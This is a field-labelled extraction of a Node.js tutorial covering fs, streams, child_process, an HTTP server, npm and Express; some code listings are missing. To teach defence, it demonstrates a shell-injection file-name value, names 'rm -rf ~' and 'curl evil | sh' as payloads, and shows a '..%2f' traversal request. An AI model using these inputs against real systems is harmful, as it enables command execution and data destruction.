Choose an implementation at run time
List the built-in modules your Node offers, one per line

gotchas: `import x from './x'` without `.js` fails with `ERR_MODULE_NOT_FOUND`; CommonJS habits do not carry over.

blocks.name: require()
blocks.sum: Load a CommonJS module synchronously and return its module.exports.

how.text: `require` resolves the path (trying `.js`, `.json`, `.node` and `index.js` when you leave the extension off), runs the file once inside a function wrapper that provides `require`, `module`, `exports`, `__filename` and `__dirname`, caches the result, and returns `module.exports`. Every later `require` of the same file returns the cached object. It exists only in CommonJS files; in an ES module, use `import`, or create one with `createRequire(import.meta.url)` from `node:module`.

examples.desc: A CommonJS module and its user
require works in node -e, so it serves quick shell one-liners
examples.code: node -e "const os = require('node:os'); console.log(os.homedir())" | xargs ls -d

blocks.name: import.meta.dirname
blocks.sum: The absolute folder of the current ES module (with import.meta.filename and import.meta.url).

how.text: ES modules have no `__dirname`. `import.meta.url` is the module's own `file://` URL; Node 20.11 added the plain-path forms `import.meta.dirname` and `import.meta.filename`. Use them to find files that ship next to your code (templates, `public/`, a seed JSON file) independently of the folder the user ran `node` from.

examples.desc: Serve files from the public folder next to this module

blocks.text: Files, paths and the operating system

The `node:fs` module comes in three flavours: callbacks (`fs.readFile(path, cb)`), synchronous (`fs.readFileSync`) and promises (`node:fs/promises`). Use the promise API with `await` in new code. Use the `Sync` versions only in short scripts or at startup, because they block the event loop, and in a server that blocks every client. Paths are built with `node:path`, never with string concatenation.

blocks.code:
$ node inventory.js
┌─────────┬──────────────────────┬────────┬───────┐
│ (index) │ name                 │ ext    │ bytes │
├─────────┼──────────────────────┼────────┼───────┤
│ 0       │ 'gamma.log'          │ '.log' │ 155   │
│ 1       │ 'delta.log'          │ '.log' │ 149   │
│ 2       │ 'report-2026-09.csv' │ '.csv' │ 68    │
│ 3       │ 'alpha.txt'          │ '.txt' │ 32    │
│ 4       │ 'beta.txt'           │ '.txt' │ 18    │
└─────────┴──────────────────────┴────────┴───────┘
wrote 5 rows to out/inventory.json
$ node inventory.js ~/lab/nope 2>&1 | grep Error
Error: ENOENT: no such file or directory, scandir '/Users/you/lab/nope'

blocks.text: Errors from `fs` carry a `code` that you branch on: `ENOENT` (no such file), `EACCES` (permission denied), `EEXIST` (already exists), `EISDIR`, `ENOTDIR`. Check `err.code`, never the message text, which can change between versions.

blocks.name: fs.readFile()
blocks.sum: Read a whole file into memory, as a Buffer or, with an encoding, a string.

how.text: The promise version runs the read on libuv's thread pool and resolves when the whole file is in memory. Without an encoding you get a `Buffer` of raw bytes; with `'utf8'` you get a string. Relative paths resolve against `process.cwd()`. For files larger than you want in memory, or to start processing before the end arrives, use `createReadStream`.

examples.desc: Read and parse JSON that lives next to the script
Count the lines of a log from zsh

gotchas: `JSON.parse(await readFile(p))` without `'utf8'` works by accident (the Buffer is converted with `toString()`), but `text.split` on a Buffer does not exist. Always pass the encoding for text.

blocks.name: fs.writeFile()
blocks.sum: Create a file or replace its contents with a string or Buffer.

how.text: Opens the file for writing (creating it, truncating it), writes everything, closes it. The parent folder must exist (`mkdir` first). A crash halfway leaves a truncated file, so data you cannot lose is written to a temporary file and then `rename`d over the original, which is atomic on the same volume: readers see the old file or the new one, never half of one. The capstone's store does exactly that.

examples.desc: Save JSON with a trailing newline
examples.code:
import { writeFile } from 'node:fs/promises';
await writeFile('out/hosts.json', JSON.stringify({ hosts: ['router', 'pi'] }, null, 2) + '\n');

examples.desc: Write what a pipeline produces, from inside Node
examples.code: node codes.js < ~/lab/access.log | node -e "let s = ''; process.stdin.on('data', (c) => (s += c)).on('end', () => require('node:fs').writeFileSync('codes.tsv', s))"

blocks.name: fs.readdir()
blocks.sum: List the entries of a directory, optionally with their types.
blocks.syntax: await readdir(path, { withFileTypes: true, recursive: false })

how.text: Returns names in no guaranteed order (sort them yourself). With `withFileTypes: true` you get `Dirent` objects with `name`, `isFile()`, `isDirectory()` and `isSymbolicLink()`, which saves a `stat` per entry. `recursive: true` (Node 20+) walks the whole tree and returns relative paths.

examples.desc: Every .log file under ~/lab, recursively

blocks.name: fs.stat()
blocks.sum: Get size, timestamps, permissions and type of a file or directory.
blocks.syntax: const info = await stat(path)    info.size  info.mtime  info.isFile()  info.mode

how.text: Wraps the `stat(2)` system call, the same data `stat -f` and `ls -l` show. `size` is in bytes, `mtime` a `Date`, `mode` the permission bits (`(info.mode & 0o777).toString(8)` gives `'644'`). `lstat` reports on a symlink itself instead of its target. A missing path rejects with `ENOENT`, which makes `stat` the usual "does it exist" test.

blocks.name: path.join()
blocks.sum: Join path segments with the right separator and normalise . and .. (path.resolve makes the result absolute).
blocks.syntax: path.join(...segments)    path.resolve(...segments)    path.basename(p, ext)    path.extname(p)    path.relative(from, to)

how.text: `join` concatenates with `/`, collapses duplicate slashes and resolves `.` and `..` textually, without touching the disk. `resolve` works right to left until it has an absolute path, prefixing `process.cwd()` if needed. Because `..` is resolved, joining user input onto a base folder can climb out of it: `path.join('/srv/public', '../app.js')` is `/srv/app.js`. Always check the result still starts with the base folder, as the static server below does.

blocks.name: node:os
blocks.sum: Facts about the machine: hostname, user, home folder, CPUs, memory, network interfaces.
blocks.syntax: os.hostname()  os.homedir()  os.userInfo()  os.cpus()  os.totalmem()  os.freemem()  os.networkInterfaces()  os.platform()

how.text: Thin wrappers over system calls, returning plain values. `os.networkInterfaces()` returns an object keyed by interface name (`lo0`, `en0`, `utun3`), each an array of `{ address, netmask, family, mac, internal, cidr }`: the same data as `ifconfig` from [Your local network](#net-local), already parsed.

blocks.text: Events, streams and Node in a zsh pipeline

Two ideas run through the whole standard library. An **EventEmitter** is an object you can subscribe to by event name: servers emit `'request'`, sockets emit `'data'` and `'close'`, processes emit `'exit'`. A **stream** is an EventEmitter that moves data in chunks: Readable (files you read, `process.stdin`, an incoming HTTP request), Writable (`process.stdout`, a file you write, an HTTP response), and Transform (gzip, line splitting) in between.

blocks.code:
$ node emitter.js; echo "status $?"
before
result 192.168.1.1 up
result 192.168.1.60 DOWN
ALERT first outage: 192.168.1.60
result 192.168.1.70 DOWN
after; down listeners left: 0
file:///Users/you/lab/node/emitter.js:21
monitor.emit('error', new Error('probe socket failed')); // nobody listens for 'error'
                      ^

Error: probe socket failed
    at file:///Users/you/lab/node/emitter.js:21:23
Emitted 'error' event on Monitor instance at:
    at file:///Users/you/lab/node/emitter.js:21:9
status 1

blocks.text: Three facts are visible. `emit` is **synchronous**: every listener ran before `report` returned, between `before` and `after`. `once` removed itself after one call. And `'error'` is special: emitting it with no listener **throws**, which crashes the process. Every socket, stream and server you create can emit `'error'`, so attach a listener or the first network hiccup kills your program.

blocks.name: EventEmitter
blocks.sum: Base class for objects that emit named events to registered listener functions.
blocks.syntax: emitter.on(name, fn)  emitter.once(name, fn)  emitter.off(name, fn)  emitter.emit(name, ...args)  await once(emitter, name)

how.text: An emitter keeps a map from event name to an array of listeners. `emit` calls them synchronously, in order, with the arguments you pass, and returns whether there were any. Extend `EventEmitter` to give your own classes events, as the capstone's monitor does. More than 10 listeners for one event prints a possible-leak warning, because adding a listener per request and never removing it is a classic memory leak.

examples.desc: Wait for a server to be ready
Turn events into lines another program can read
examples.code: node -e "const m = new (require('node:events'))(); m.on('up', (h) => console.log(h)); ['router', 'pi'].forEach((h) => m.emit('up', h))" | wc -l

gotchas: An `'error'` event without a listener throws. Always handle `'error'` on sockets, servers, streams and child processes.

blocks.text: A Node script in a shell pipeline

`process.stdin` is a Readable stream, so a Node script can sit in the middle of a zsh pipeline exactly like `awk` in [Pipes](#pipes). Data arrives in chunks of arbitrary size (often 64 KB), which can cut a line in half; `readline` reassembles them into whole lines, and `for await` consumes them one at a time.

blocks.code:
cat access.log ──▶ ║pipe║ ──▶ ⟪c:process.stdin⟫ ──▶ ⟪c:readline⟫ ──▶ your loop ──▶ ⟪g:process.stdout⟫ ──▶ ║pipe║ ──▶ sort, head
                              Readable, chunks     whole lines                Writable
                                                       console.error ──▶ ⟪r:stderr⟫ ──▶ terminal

$ node codes.js < ~/lab/access.log
200	57
301	14
401	12
404	11
304	10
403	8
302	6
500	2
$ printf 'garbage line\n' | cat ~/lab/access.log - | node codes.js | sort -n | head -3
skipping: garbage line
200	57
301	14
302	6

blocks.text: The `skipping:` line went to stderr, so it reached the terminal and stayed out of `sort`. Now remove the `process.stdout.on('error', ...)` block and pipe into `head -1`:

blocks.code:
$ cat ~/lab/access.log | node codes.js | head -1
200	57
node:events:497
      throw er; // Unhandled 'error' event
      ^

Error: write EPIPE

blocks.text: `head` exits after one line and closes the pipe. The next `write` fails with **EPIPE** (broken pipe), the stream emits `'error'`, nobody listens, and Node crashes. Classic Unix tools die silently from `SIGPIPE`; Node ignores that signal and reports the error, so a filter script handles `EPIPE` and exits 0. The crash depends on timing, which is why the handler belongs in every filter.
Streams between files: pipeline()

`pipeline` connects streams the way `|` connects processes, forwards errors from any stage, and cleans every stream up when one fails. It also applies **back-pressure**: when the writer is slow, the reader pauses, so memory use stays flat whatever the file size.

blocks.code:
$ node gzip.js ~/lab/access.log
/Users/you/lab/access.log: 13163 -> 1792 bytes (13.6%)
$ gunzip -c ~/lab/access.log.gz | head -2
45.33.32.156 - - [07/Oct/2026:09:14:08 +0000] "GET /api/v1/orders HTTP/1.1" 404 782 "-" "curl/8.4.0"
198.51.100.8 - - [07/Oct/2026:09:14:15 +0000] "GET /images/logo.png HTTP/1.1" 304 0 "-" "Googlebot/2.1"
$ node gzip.js missing.log 2>&1 | grep -m1 Error
[Error: ENOENT: no such file or directory, open 'missing.log'] {
$ rm ~/lab/access.log.gz

blocks.name: readline.createInterface()
blocks.sum: Split a Readable stream (stdin, a file) into whole lines you can loop over.
blocks.syntax: for await (const line of readline.createInterface({ input, crlfDelay: Infinity })) { ... }

how.text: Buffers incoming chunks, cuts them at newlines and emits one `'line'` event per line, without the newline; the interface is also async-iterable, so `for await` reads one line at a time and pauses the input while your loop body runs. `crlfDelay: Infinity` treats `\r\n` as one line break even when the two bytes arrive in different chunks, which matters for logs from Windows or network devices.

examples.desc: Number the lines of a file
Count requests per status code in a pipeline

blocks.name: fs.createReadStream()
blocks.sum: Open a file as a Readable stream that delivers it in chunks (64 KB by default).
blocks.syntax: createReadStream(path, { encoding, start, end, highWaterMark })      // from 'node:fs'

how.text: Opens the file and reads it chunk by chunk as the consumer asks for data, so memory stays at one chunk however big the file is. `start` and `end` (byte offsets, inclusive) read a slice, which is how a server answers a `Range` request. Missing files are reported as an `'error'` event, not a throw, so use it inside `pipeline` or attach a handler.

examples.desc: Send a file as an HTTP response body
Stream a file to stdout and keep using shell tools

blocks.name: stream.pipeline()
blocks.sum: Connect a chain of streams, propagate errors from any stage and clean up all of them.

how.text: The `.pipe()` method connects two streams but does not forward errors and leaves the others open when one fails, leaking file descriptors. `pipeline` wires every stage, destroys all streams on the first error and settles one promise with the outcome. Stages may also be async generator functions, which makes an ad-hoc Transform a few lines long.

examples.desc: Uppercase a file with a generator stage
Compress from stdin to stdout, like gzip in a pipeline
examples.code: cat ~/lab/access.log | node -e "require('node:stream').pipeline(process.stdin, require('node:zlib').createGzip(), process.stdout, (e) => e && console.error(e))" | gunzip | wc -l

blocks.text: Running other programs: node:child_process
Sometimes the right tool already exists (`ping`, `dig`, `git`, `networksetup`). `node:child_process` starts it. There are two families, and the difference is security, not convenience.

blocks.code:
$ cd ~/lab
$ node node/lines.js access.log
exec:     120 access.log
execFile: 120 access.log
$ node node/lines.js 'access.log; echo INJECTED > owned.txt'
exec:     120 access.log
execFile: wc exited with 1 (no such file, nothing else ran)
$ cat owned.txt
INJECTED
$ rm owned.txt

blocks.text: With `exec`, the "file name" was shell code: `/bin/sh` saw a `;`, ran `wc`, then ran the attacker's command. Replace `echo INJECTED` with `rm -rf ~` or `curl evil | sh` and you see the stakes. With `execFile`, the whole string was one argument to `wc`, which simply found no such file. This is **shell injection**, the same bug as `subprocess.run(..., shell=True)` in [Python files and pipelines](#py-files), and the rule is the same: pass an argument array and never build a command string from data.

blocks.title: Data never goes into a command string

blocks.text: Any value that came from a user, a file, a URL or an HTTP request goes to `execFile` or `spawn` as an element of the argument array. If you need shell features (pipes, globs), do them in Node instead (`pipeline`, `readdir`), or validate the value against a strict pattern first, such as an IPv4 regex for a host.

blocks.name: child_process.execFile()
blocks.sum: Run a program with an argument array, no shell, and collect its stdout and stderr.
blocks.syntax: execFile(file, args, { timeout, maxBuffer, cwd, env }, callback)      const { stdout } = await promisify(execFile)(file, args)

how.text: Node forks and executes `file` directly, looking it up on `PATH`, with `args` as the exact argument vector. No shell parses anything, so spaces, quotes, `;` and `$()` in an argument are just characters. Output is buffered in memory (1 MB `maxBuffer` by default) and handed over when the process exits; a non-zero exit status rejects the promise with `err.code` set to that status, and `timeout` kills a hung child.

examples.desc: Ping one host safely on macOS (-c count, -t whole-run timeout in seconds)
Let Node run ls with an argument array and count what it printed

gotchas: `execFile` cannot run shell syntax: `execFile('ls *.log')` looks for a program literally named `ls *.log`.

blocks.name: child_process.exec()
blocks.sum: Run a command string through /bin/sh and collect its output; never with untrusted data.
blocks.syntax: exec(command, { timeout, cwd }, callback)      const { stdout } = await promisify(exec)(command)

how.text: Spawns `/bin/sh -c command`, so the string can use pipes, globs, redirection and variables. That power is the danger: anything interpolated into the string is parsed as shell code. Use it only for fixed strings you wrote yourself.

examples.desc: A fixed pipeline you wrote yourself
Compare its output with the same pipeline typed in zsh
examples.code: echo "$(netstat -an -p tcp | grep -c LISTEN) listening TCP sockets"

blocks.name: child_process.spawn()
blocks.sum: Start a program and talk to it through streams, for long-running or large-output processes.
blocks.syntax: const child = spawn(cmd, args, { stdio, cwd, env })    child.stdout.on('data')    child.on('close', (code) => ...)

how.text: Like `execFile`, no shell by default and an argument array, but nothing is buffered: `child.stdout` and `child.stderr` are Readable streams and `child.stdin` is Writable, so you can process `ping` output line by line while it runs, or feed a program gigabytes of input. `stdio: 'inherit'` connects the child to your terminal directly. Listen for `'error'` (program not found) and `'close'` (exit code).

blocks.text: A web server from scratch with node:http

`node:http` is a complete HTTP/1.1 server with no framework on top. You give `http.createServer` one function, and Node calls it for every request with two objects: `req` (an `IncomingMessage`: a Readable stream with `method`, `url` and `headers`) and `res` (a `ServerResponse`: a Writable stream with `writeHead`, `write` and `end`). Routing, body parsing, JSON and static files are your job. Doing that once is the best way to understand what Express does for you later.

blocks.code:
curl ──TCP──▶ ⟪c:net.Server⟫ ──▶ ⟪c:llhttp⟫ parses "POST /api/echo?x=1 HTTP/1.1" + headers
                                  │
                                  ▼  'request' event, once per request (many per keep-alive connection)
                     handler(⟪y:req⟫, ⟪g:res⟫)
                       req.method  'POST'          req.url  '/api/echo?x=1'   (path + query only, as sent)
                       req.headers { host, 'content-type', ... }   lower-cased names
                       for await (chunk of req)    the body, as Buffers
                       res.writeHead(201, { 'Content-Type': 'application/json' })
                       res.end(body)               send and finish; forget it and the client waits forever

blocks.text: `req.url` has no scheme or host, so parse it with a base: `new URL(req.url, 'http://localhost')`. Here is the routing logic on its own, runnable in the page. Change the requests at the bottom:

The last line matters for security: the URL parser resolved `..`, so `/api/../api/devices` became `/api/devices`. It does not decode `%2f` into `/`, though, which is why a static file server must check the final path itself.
One more detail before the server. `Content-Length` counts **bytes**, and a JavaScript string's `length` counts UTF-16 code units. They differ as soon as text is not plain ASCII:
Send `Content-Length: 36` for that body and the client stops reading 4 bytes early. `Buffer.byteLength(body)` gives the right number in Node.
The server
Split the code in two files: `app.js` builds the server and exports a factory, `server.js` starts it. Tests will import the factory and start their own copy on a free port.
Give it a page to serve, `public/index.html`, which calls the API with `fetch` as you did in [The DOM](#dom):

Points worth stealing for every server you write:

items.text: **Every path ends in `res.end()`**, errors included. The outer `.catch` turns a bug into a logged 500 instead of a hung client or a crash.
**Bodies are streams with a size limit.** Without `MAX_BODY`, a client can fill your memory.

**Status codes carry meaning**: 400 for a body you cannot parse, 405 plus an `Allow` header for a wrong method, 413 for too large, 415 for the wrong `Content-Type`, 404 for missing. `curl -i` and the Network panel show them; [HTTP and TLS](#http) has the full table.

**Static files need a path check.** `curl --path-as-is` sends `..%2f` literally (curl normally resolves `..` itself). Decoded, it would climb out of `public/`; the `startsWith(PUBLIC + path.sep)` test refuses it with 403.

blocks.text: Start the server twice and the second copy prints `port 3000 is already in use` (thanks to the `'error'` handler; without it, Node prints a stack trace with `listen EADDRINUSE: address already in use 127.0.0.1:3000`). blocks.name: http.createServer()
blocks.sum: Create an HTTP server that calls your handler with a request and a response object for every request.

how.text: Returns an `http.Server` (a `net.Server` with the llhttp parser on top). Each TCP connection can carry many requests (keep-alive), and each parsed request fires `'request'`, which calls your handler. `req` is a Readable stream of the body plus `method`, `url` and lower-cased `headers`; `res` is a Writable with `statusCode`, `setHeader`, `writeHead`, `write` and `end`. The server starts accepting only after `listen`.

examples.desc: The smallest JSON endpoint
Hit it and pick a field

blocks.name: response.writeHead()
blocks.sum: Send the status line and headers of an HTTP response in one call.

how.text: Headers must go out before the body, so `writeHead` (or the first `write`) commits them; setting a header afterwards throws `ERR_HTTP_HEADERS_SENT`. `res.end(body)` writes the last chunk and finishes the response. Without `Content-Length`, Node uses chunked transfer encoding, which works but prevents the client from showing progress. For `HEAD` requests Node sends the headers and drops the body for you.

examples.desc: A redirect
Watch the headers Node actually sends

gotchas: Calling `res.end()` twice, or `writeHead` after `end`, throws. Return right after sending, as the handlers above do with `return sendJson(...)`.

blocks.name: server.listen()
blocks.sum: Bind a server to a port and address and start accepting connections.

how.text: Creates the listening socket with `bind(2)` and `listen(2)`. The host decides who can connect: `127.0.0.1` only this Mac, `0.0.0.0` every IPv4 interface, so other devices on your LAN. Port `0` asks the kernel for any free port, which tests use to avoid collisions; read it back from `server.address().port` once `'listening'` fires. Failures (`EADDRINUSE`, `EACCES`) arrive as an `'error'` event. `close()` stops accepting new connections and calls back when existing ones finish.

examples.desc: A free port for a test

blocks.text: npm: packages, package.json and scripts

**npm** is three things: a registry of millions of packages at registry.npmjs.org, a command-line client, and a file format, `package.json`, that describes your project. You already have the file. Here is what `npm init -y` writes with npm 11 (npm 10 omits the last line):

blocks.code:
$ npm init -y
Wrote to /Users/you/lab/node/package.json:

{
  "name": "node",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "type": "commonjs"
}

head: Field
Meaning
rows: identity; required only if you publish (`private: true` prevents accidental publishing)
`module` or `commonjs`: how `.js` files in this package are loaded
the entry point other code gets when it imports your package
named shell commands: `npm run NAME` (`test`, `start` also work without `run`)
packages needed only while developing (formatters, linters, test tools)
Node versions you support, such as `{ "node": ">=22" }`

blocks.code:
$ npm install express

29 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities
$ npm pkg get dependencies
{
  "express": "^5.3.0"
}
$ npm ls
node@1.0.0 /Users/you/lab/node
└── express@5.3.0
$ ls node_modules | wc -l
      65

blocks.text: One command, 65 packages: Express and its dependencies. npm resolved the newest matching version, unpacked the tree into `node_modules/`, added `"express": "^5.3.0"` to `package.json`, and recorded the exact tree in **package-lock.json**: each package's version, URL and `integrity` hash (SHA-512), verified on every later install. `npm uninstall express` reverses all of it.

blocks.code:
package.json   "express": "^5.3.0"       a RANGE you accept           commit it
       │ npm install resolves
       ▼
 package-lock.json  express 5.3.0, body-parser 2.4.0, ... + sha512 hashes     the exact TREE   commit it
       │ npm install / npm ci downloads
       ▼
 node_modules/  express/  body-parser/  qs/  ... 65 folders              the INSTALL   never commit it (.gitignore)

blocks.text: Semantic versions and ranges
A version `MAJOR.MINOR.PATCH` promises: PATCH fixes bugs, MINOR adds features compatibly, MAJOR may break you. The range in `package.json` says which future versions you accept:

head: Range
Means
Accepts
Rejects
rows: same major, at least this version
for 0.x, the minor is treated as major

blocks.text: Here is the caret and tilde logic in a few lines. Predict the output, then run it and try `'^0.4.2'`:
The real implementation is the `semver` package, which `npx` can run without installing it into your project:
Updates, audits and the supply chain
In a scratch folder with an old Express 4 installed, `npm outdated` and `npm audit` show the two maintenance questions: what is behind, and what is known to be vulnerable.

blocks.code:
$ npm outdated
Package  Current  Wanted  Latest  Location              Depended by
express   4.18.2  4.22.3   5.3.0  node_modules/express  oldpkg
$ npm audit | tail -5
7 vulnerabilities (3 low, 1 moderate, 3 high)

To address all issues, run:
  npm audit fix

blocks.text: **Wanted** is the newest version your range allows (`npm update` goes there); **Latest** is the newest published, here a new major that needs `npm install express@5` and the migration guide. `npm audit` compares your lockfile with the GitHub advisory database; `npm audit fix` applies compatible upgrades only.

blocks.title: Installing a package runs its code

blocks.text: `npm install` executes `preinstall`/`install`/`postinstall` scripts from every package in the tree, with your user's permissions, before you have looked at anything. Typo-squatted names (`expresss`, `lodahs`) exist to exploit that. Check the exact name and weekly downloads on npmjs.com before adding a dependency, prefer fewer dependencies, commit `package-lock.json`, and consider `npm install --ignore-scripts` for packages that should not need a build step.
Scripts and watch mode
`scripts` turns long commands into short names, and npm adds `node_modules/.bin` to `PATH` while they run, so tools installed in the project work without `npx`. Add three scripts with `npm pkg set`:

blocks.code: npm pkg set scripts.start="node server.js" scripts.dev="node --watch server.js" scripts.test="node --test"

$ npm run
Lifecycle scripts included in node@1.0.0:
  test
    node --test
  start
    node server.js
available via `npm run-script`:
  dev
    node --watch server.js
$ npm run dev
listening on http://127.0.0.1:3000
Restarting 'server.js'
listening on http://127.0.0.1:3000

blocks.text: `node --watch` restarted the server when `app.js` changed, because `server.js` imports it. It watches the module graph, not every file: edits to `public/index.html` need no restart (the file is read per request), and a data file the server writes does not trigger a restart loop.

blocks.name: npm init
blocks.sum: Create a package.json for a new project (-y accepts every default).

how.text: Writes `package.json` in the current folder, taking the name from the folder. Interactive mode asks for each field; `-y` takes the defaults. `npm init vite` and similar forms download and run a project generator named `create-vite`. Edit the result with `npm pkg set` or by hand.

blocks.sum: Read or change package.json fields from the command line.
blocks.syntax: npm pkg get [field...]      npm pkg set field=value ...      npm pkg delete field

how.text: Edits the JSON safely (no broken commas) and keeps the formatting. Nested fields use dots (`scripts.test`), and values are strings unless you pass `--json`.

blocks.name: npm install
blocks.sum: Install a package (and record it), or install everything package.json and the lockfile list.

how.text: With a name, npm resolves the newest version that matches (or the range you give, `express@5`), downloads the whole dependency tree into `node_modules`, adds the package to `dependencies` (`-D` puts it in `devDependencies`) and updates `package-lock.json`. Without a name, it installs what the lockfile records, adjusting the lockfile only if `package.json` changed.

blocks.name: npm ci
blocks.sum: Delete node_modules and install exactly what package-lock.json records, failing if it disagrees with package.json.

how.text: Made for fresh clones, servers and CI: it never changes the lockfile, refuses to run if `package.json` and the lock disagree, and starts from an empty `node_modules`, so every machine gets the identical tree with verified hashes. `--omit=dev` skips devDependencies for a production install.

blocks.name: npm outdated
blocks.sum: List dependencies that have newer versions: what your range allows (Wanted) and the newest (Latest).

how.text: Compares installed versions with the registry. `npm update` moves packages to Wanted, staying inside your ranges, and updates the lockfile. Reaching Latest across a major version is a deliberate `npm install pkg@major`, after reading the changelog. The command exits 1 when anything is outdated.

blocks.name: npm audit
blocks.sum: Check the installed dependency tree against known security advisories, and optionally fix them.

how.text: Sends the lockfile's package list to the registry, which answers with matching advisories (severity, affected range, fixed version). `npm audit fix` applies upgrades that stay within your ranges; `--force` also crosses major versions and can break your code. Not every advisory matters for your use (a denial-of-service bug in a parser you never feed untrusted data), but read each high one.

blocks.name: npm run
blocks.sum: Run a named script from package.json with node_modules/.bin on PATH.
blocks.syntax: npm run NAME [-- args]      npm start      npm test      node --run NAME

how.text: Runs the script's command in `/bin/sh` from the project folder. `pre<name>` and `post<name>` scripts run before and after automatically. Arguments after `--` are appended (`npm test -- --test-name-pattern=POST`). `npm run` alone lists the scripts. Node 22's `node --run NAME` does the same with less startup overhead and without the pre/post hooks.

blocks.sum: Run a command from a package: the project's local copy if installed, otherwise a temporary download.

how.text: Looks for the command in `node_modules/.bin`, then in a cache, and otherwise offers to download the package (`-y` skips the question) and runs it. The same supply-chain caution applies: a typo in the name downloads and runs someone else's code.

blocks.name: node --watch
blocks.sum: Run a script and restart it whenever it or a module it imports changes.

how.text: Node runs the script in a child process and watches every file in its module graph. On a change it kills the child and starts a new one, clearing the screen and printing `Restarting 'script.js'`. `--watch-path` watches a folder instead. It reloads server code only; the browser still needs a refresh.

blocks.text: Express: routing and middleware

Express is the most used Node web framework, and its core idea is small: a request travels through a list of **middleware** functions `(req, res, next)`. Each one may end the response (`res.json(...)`) or call `next()` to pass the request on. Routes are middleware that only run for one method and path. Error handlers are middleware with **four** parameters, and they only run when something called `next(err)` or threw.

blocks.code:
request ─▶ [logger] ─next()─▶ [cors] ─next()─▶ [static] ─next()─▶ [json parser] ─next()─▶ [routes] ─▶ res.json()
               │                  │ OPTIONS: 204      │ file exists: send it           │ no match
               │                  ▼                   ▼                                ▼
               │               (done)              (done)                        [404 handler]
               └──── throw / next(err) / rejected promise ──────────────────────────▶ [error handler (err, req, res, next)]

blocks.text: The loop that drives it fits in 25 lines. This model skips routing, but the skip-and-continue logic is the real one:

blocks.out:
1 logger GET /api/status
2 route: send JSON
1 logger GET /boom
3 error handler: kaboom
1 logger GET /nope
end of stack: 404

blocks.text: Delete `next();` from the logger and run it again: every request stops after line 1. In a real server that means a client that waits until it times out, the most common Express bug.

tokens.exp: register a handler for GET requests only
path pattern; :port captures one segment into req.params.port (a string)
the handler: Node's request and response plus Express helpers
set the status, then send JSON with the right headers
end of the call; routes run in the order they were added

blocks.text: The same server in Express
Install Express 5 (`npm install express`; version 5 has been the default on npm since 2025 and needs Node 18 or later) and rebuild `app.js`, plus CORS and two new routes:

blocks.code:
$ curl -i http://localhost:3000/api/status HTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 53 ETag: W/"35-ZHttEot7fm8iHDgDCv3BZshyueo" Date: Sun, 25 Oct 2026 04:58:29 GMT Connection: keep-alive Keep-Alive: timeout=5 {"host":"macbook.local","uptime":1,"node":"v22.22.0"} $ curl -s http://localhost:3000/api/ports/22; echo; curl -s http://localhost:3000/api/ports/70000 {"port":22,"service":"ssh"} {"error":"port must be 1-65535"} $ curl -s -X POST http://localhost:3000/api/echo -H 'Content-Type: application/json' -d '{"name":' {"error":"body must be JSON"} $ curl -s 'http://localhost:3000/api/log?lines=2' 185.220.101.4 - - [07/Oct/2026:10:13:24 +0000] "GET /admin HTTP/1.1" 401 454 "-" "python-requests/2.31.0" 172.16.5.9 - - [07/Oct/2026:10:13:27 +0000] "GET / HTTP/1.1" 200 32701 "-" "python-requests/2.31.0" $ curl -s http://localhost:3000/api/nope {"error":"no route for GET /api/nope"} $ curl -s http://localhost:3000/nope.html Error 
Cannot GET /nope.html

blocks.text: Compared with the hand-written version, Express added an `ETag` (browsers revalidate and get a 304), static files with `Last-Modified`, ranges and traversal protection, `res.json` with the right type and byte length, parsed `req.query` and `req.params`, and one error funnel. The `/api/log` route also shows **Express 5's async support**: when `readFile` rejects (rename `~/lab/access.log` and retry), the rejection goes to the error handler, which answers `500 {"error":"internal server error"}` and logs `Error: ENOENT: no such file or directory, open '/Users/you/lab/access.log'` in the server tab. Express 4 did not catch rejected promises: the request hung, or the unhandled rejection crashed the whole process.

blocks.title: Express 5 hands listen errors to your callback

blocks.text: In Express 5, `app.listen(port, host, cb)` registers `cb` for the `'error'` event as well. A callback written as `() => console.log('listening')` therefore prints "listening" when the port is taken, and the process exits with status 0 because nothing is listening. Take the error parameter, as above: the second copy then prints `cannot listen: listen EADDRINUSE: address already in use 127.0.0.1:3000` and exits 1.

blocks.name: express()
blocks.sum: Create an Express application: a request handler function with a middleware stack and routing methods.
blocks.syntax: import express from 'express'; const app = express(); app.listen(port, host, (err) => {...})

how.text: The returned `app` is itself a function `(req, res)` you could pass to `http.createServer(app)`, which is what `app.listen` does internally (and what the capstone does, so tests can control the server). `req` and `res` are the Node objects with extra methods: `req.params`, `req.query`, `req.body`, `req.get()`, `req.is()`, `res.status()`, `res.json()`, `res.send()`, `res.set()`, `res.type()`, `res.location()`, `res.sendStatus()`.

Check the header is really gone

blocks.name: app.use()
blocks.sum: Add middleware that runs for every request, or for every request under a path prefix.
blocks.syntax: app.use([path,] (req, res, next) => {...})      app.use((err, req, res, next) => {...})

how.text: Middleware runs in the order you register it. Each call either ends the response or calls `next()`. With a path (`app.use('/api', fn)`), it runs for that prefix and everything below it. A function with four parameters is an error handler: skipped normally, called when an earlier layer threw, called `next(err)`, or (Express 5) returned a rejected promise.

examples.desc: A timing logger
Generate traffic and watch the log line per request

gotchas: Order is behaviour. A 404 handler registered before your routes answers every request with 404.

blocks.name: app.get()
blocks.sum: Register a route handler for one HTTP method and path pattern (also post, put, patch, delete, all).

how.text: The path is matched against `req.path`; `:name` captures one segment into `req.params.name` as a string, so convert numbers yourself. Several handlers can be chained (validation, then the action). `express.Router()` groups routes under a prefix, as the capstone does with `app.use('/api', api)`. Express 5 changed wildcard syntax: `*` alone is gone, write `/*splat`.

examples.desc: Read one device by id
Request several ids and print only the status codes

blocks.name: express.json()
blocks.sum: Middleware that parses JSON request bodies into req.body.

how.text: For requests whose `Content-Type` is `application/json`, it reads the body stream (refusing more than `limit`, 100 kB by default, with a 413), parses it and stores the result in `req.body`. Other content types are left alone, and in Express 5 `req.body` then stays `undefined`. Malformed JSON becomes an error with `status 400` and `type: 'entity.parse.failed'`, delivered to your error handler.

examples.desc: Accept JSON up to 10 kB
Send a 2 MB body to express-server.js (limit 1 MB) and see the status: 413
examples.code: cat /dev/zero | head -c 2000000 | tr '\0' 'a' | sed 's/.*/{"name":"&"}/' | curl -s -o /dev/null -w '%{http_code}\n' -H 'Content-Type: application/json' --data-binary @- http://localhost:3000/api/echo
